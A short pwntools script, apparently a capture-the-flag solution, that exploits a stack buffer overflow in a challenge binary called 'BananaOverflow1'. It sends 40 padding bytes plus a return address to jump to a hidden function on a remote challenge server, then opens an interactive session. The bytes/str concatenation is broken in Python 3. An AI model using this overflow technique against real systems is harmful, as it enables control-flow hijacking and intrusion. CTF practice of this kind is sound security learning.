
from pwn import *

e = ELF('BananaOverflow1')
#p = e.process()
p = remote('challenges.issessions.ca', 5701)

p.sendline(b"A" * 40 + "\x32\x93\x04\x08")
print(e.sym['you_better_not_hack_me_and_take_my_banana'])
# this is a local execution solve
p.interactive()